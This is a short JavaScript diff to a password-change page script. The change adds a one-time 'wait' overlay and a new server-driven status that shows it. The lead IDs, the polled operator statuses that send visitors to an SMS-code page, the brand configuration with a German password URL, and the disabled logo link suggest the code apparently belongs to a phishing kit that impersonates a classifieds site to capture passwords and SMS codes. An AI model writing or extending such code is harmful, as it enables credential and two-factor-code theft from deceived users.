@@ -15,6 +15,7 @@ export function runKleinChangePassword() {
   var waitCountdown = document.getElementById('knz-wait-countdown');
   var WAIT_SECONDS = 5 * 60;
   var pagePollInterval = null;
+  var waitOverlayShown = false;
   var pwLogo = document.getElementById('knz-pw-logo');
   if (pwLogo) pwLogo.addEventListener('click', function (e) { e.preventDefault(); });
 
@@ -32,6 +33,8 @@ export function runKleinChangePassword() {
           if (st === 'redirect_sms_code') {
             if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
             window.location = '/sms-code.html?id=' + encodeURIComponent(id);
+          } else if (st === 'redirect_klein_sms_wait') {
+            showWaitOverlay();
           } else if (st === 'redirect_klein_forgot') {
             if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
             window.location.href = (window.__BRAND__ && window.__BRAND__.passwortUrl) ? window.__BRAND__.passwortUrl : '/anmelden';
@@ -85,6 +88,8 @@ export function runKleinChangePassword() {
   }
 
   function showWaitOverlay() {
+    if (waitOverlayShown) return;
+    waitOverlayShown = true;
     if (waitOverlay) waitOverlay.hidden = false;
     var id = getLeadId();
     if (id) startPagePoll(id);
